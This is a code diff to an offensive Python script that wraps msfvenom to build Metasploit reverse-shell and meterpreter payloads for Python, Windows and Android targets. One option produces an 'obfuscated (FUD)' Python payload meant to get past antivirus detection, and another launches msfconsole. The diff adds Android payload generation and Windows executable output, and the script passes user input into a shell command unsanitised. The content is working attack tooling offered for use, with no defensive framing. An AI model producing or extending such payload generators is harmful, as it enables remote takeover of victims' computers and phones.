@@ -39,6 +39,8 @@ lhost = varsx.lhost
 lport = varsx.lport
 pyoutfile = varsx.pyoutfile
 winoutfile = varsx.winoutfile
+androutfile = varsx.androutfile
+defaultarch = "x86"
 talkbackm1 = "tcp"
 
 def clearscreen():
@@ -76,13 +78,16 @@ def lask():
     lhostask = inputc("Enter Host leave empty for default " + colorama.Fore.LIGHTRED_EX + "(" + lhost + ")" + colorama.Fore.BLUE + " : ")
     lportask = inputc("Enter Host leave empty for default " + colorama.Fore.LIGHTRED_EX +  "(" + lport +  ")" + colorama.Fore.BLUE + " : ")
     if lhostask.strip() != '':
-        lhost = lhostask
+        lhost = str(lhostask)
     if lportask.strip() != '':
-        lport = lportask    
+        lport = str(lportask)    
     print(colorama.Style.RESET_ALL)
 
 def payloadgen1(payload, talkback, lhost, lport, outfile):
     subprocess.run(["msfvenom", "-p", payload + "/meterpreter/reverse_" + talkback, "LHOST=" + lhost, "LPORT=" + str(lport), "-o", outfile])    
+
+def payloadgen2(payloadandsession, lhost, lport, outfile, args1, args2):
+    subprocess.run(f"msfvenom {args1} -p {payloadandsession} LHOST={lhost} LPORT={lport} {args2} -o {outfile}", shell=True)    
 
 
 def asktb():
@@ -96,7 +101,7 @@ def asktb():
     elif talkbackopt == "2" or talkbackopt == "https":
         talkbackm1 = "https"
     else:
-        print (f"{colorama.Fore.GREEN}Defaulting to {colorama.Fore.LIGHTRED_EX}{talkbackm1} {colorama.Style.RESET_ALL}")
+        print (f"{colorama.Fore.GREEN}Defaulting to {colorama.Fore.LIGHTRED_EX}{talkbackm1} {colorama.Style.RESET_ALL}\n")
 
         
 
@@ -106,19 +111,25 @@ def pythonpayload():
     n = 1
     clearscreen()
     printbannred("Python Payload Menu")
-    printopt("Create a simple python payload")
-    printopt("Create an obfistucated (FUD) python payload")
+    printopt("Create a simple python meterpreter payload")
+    printopt("Create an obfistucated (FUD) python meterpreter payload")
     inputpy = inputc("Option: ").strip()
     lask()
-    asktb()
     inputpy2 = inputc(f"Enter file to save payload as. Leave empty for default {colorama.Fore.LIGHTRED_EX}({pyoutfile}){colorama.Fore.BLUE}: ")
+    asktb()
     if inputpy2.strip() != "":
         pyoutfile = inputpy2
     #generate simple payload    
     if inputpy == "1":
         print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
-        payloadgen1("python", talkbackm1, lhost, lport, pyoutfile)
+        #payloadgen1("python", talkbackm1, lhost, lport, pyoutfile)
+        payloadgen2(f"python/meterpreter/reverse_{talkbackm1}", lhost, lport, pyoutfile, '', '')
         print(colorama.Style.RESET_ALL)
+        print(colorama.Fore.LIGHTGREEN_EX + f"#====================#\nDone! \nSaved as {pyoutfile}\n(If no errors were encountered that is)\n#====================#\n\n" + colorama.Style.RESET_ALL)
+        time.sleep(2)
+        menu()
+
+
     elif inputpy == "2": 
         print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
         payloadgen1("python", talkbackm1, lhost, lport, pyoutfile + ".tmp")    
@@ -150,25 +161,64 @@ def pythonpayloadfud():
     file = open(pyoutfile, "w")
     file.write(outpy)
     file.close
-    print(colorama.Fore.LIGHTGREEN_EX + f"Done! \n Saved as {pyoutfile}" + colorama.Style.RESET_ALL)
+    print(colorama.Fore.LIGHTGREEN_EX + f"#====================#\nDone! \nSaved as {pyoutfile}\n(If no errors were encountered that is)\n#====================#\n\n" + colorama.Style.RESET_ALL)
+    time.sleep(2)
+    menu()
 
 def winpayload():                         
     global n, winoutfile, lhost, lport, talkbackm1
+    n = 1
+    clearscreen()
     printbannred("Windows Payload Menu")
-    printopt("Create a simple windows payload")
+    printopt("Create a simple windows meterpreter payload")
+    printopt("Create a siple windows shell payload")
     inputwin = inputcopt("Option: ").strip()
     lask()
+    inputy2 = inputc(f"Enter file to save payload as. Leave empty for default {colorama.Fore.LIGHTRED_EX}({winoutfile}){colorama.Fore.BLUE}: ")
     asktb()
+    if inputy2.strip() != "":
+        winoutfile = inputy2
     if inputwin == "1": 
         print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
-        payloadgen1("windows", talkbackm1, lhost, lport, winoutfile)
+        payloadgen2("windows/meterpreter/reverse_tcp", lhost, lport, winoutfile,f'-a {defaultarch}','-b "\\x00" -f exe')
         print(colorama.Style.RESET_ALL)
-        print(colorama.Fore.LIGHTGREEN_EX + f"Done! \nSaved as {winoutfile}" + colorama.Style.RESET_ALL)
+        print(colorama.Fore.LIGHTGREEN_EX + f"#====================#\nDone! \nSaved as {winoutfile}\n(If no errors were encountered that is)\n#====================#\n\n" + colorama.Style.RESET_ALL)
+        time.sleep(2)
+        menu()
+    if inputwin == "2":
+        print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
+        payloadgen2("windows/shell/reverse_tcp", lhost, lport, winoutfile,f'-a {defaultarch}','-b "\\x00" -f exe')
+        print(colorama.Style.RESET_ALL)
+        print(colorama.Fore.LIGHTGREEN_EX + f"#====================#\nDone! \nSaved as {winoutfile}\n(If no errors were encountered that is)\n#====================#\n\n" + colorama.Style.RESET_ALL)
+        time.sleep(2)    
 
     else:
         print(colorama.Fore.LIGHTRED_EX + f"ERR: Option {inputwin} is not valid" + colorama.Style.RESET_ALL) 
-        time.sleep(5)
+        time.sleep(2)
         winpayload()   
+
+def androidpayload():
+    global  n, androutfile, lhost, lport, talkbackm1
+    n = 1
+    clearscreen()
+    printbannred("Android Payload Menu")
+    printopt("Create a simple android payload")
+    inputy = inputcopt("Option: ").strip()
+    lask()
+    asktb()
+    if inputy == "1": 
+        print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
+        #payloadgen1("android", talkbackm1, lhost, lport, androutfile)
+        payloadgen2(f"android/meterpreter/reverse_{talkbackm1}", lhost, lport, androutfile, '', '')
+        print(colorama.Style.RESET_ALL)
+        print(colorama.Fore.LIGHTGREEN_EX + f"Done! \nSaved as {androutfile} \n\n" + colorama.Style.RESET_ALL)
+        time.sleep(2)
+        menu()
+
+    else:
+        print(colorama.Fore.LIGHTRED_EX + f"ERR: Option {inputy} is not valid" + colorama.Style.RESET_ALL) 
+        time.sleep(2)
+        androidpayload()   
 
 
     
@@ -177,20 +227,28 @@ def menu():
     printopt("Create a python payload (MSF)")
     printopt("Create a windows payload (MSF)")
     printopt("Create an android payload (MSF)")
-    printopt("Start the Metasploit Framework Console")
-    input1 = inputcopt("Option: ")
+    #Option for Metasploit 
+    print(colorama.Fore.BLUE + "[" +  colorama.Style.RESET_ALL + "M" + colorama.Fore.BLUE + "] " + colorama.Fore.LIGHTBLUE_EX + "Start the Metasploit Framework Console" + colorama.Style.RESET_ALL)
+    input1 = inputcopt("Option: ").strip().lower()
     if input1 == "1":
         pythonpayload()
     elif input1 == "2":
         winpayload()
+    elif input1 == "3":
+        androidpayload() 
+    elif input1 == "m":
+        clearscreen()
+        print(colorama.Fore.LIGHTRED_EX)
+        subprocess.run("msfconsole")    
     else:
+        print(colorama.Fore.LIGHTRED_EX + f"ERR: Option {input1} is not valid" + colorama.Style.RESET_ALL)
+        time.sleep(2)
         menu()        
         
 def main():
-    clearscreen()
     print (colorama.Fore.LIGHTRED_EX + banner +  colorama.Style.RESET_ALL)
     menu()
-
+clearscreen()
 main()
 
 
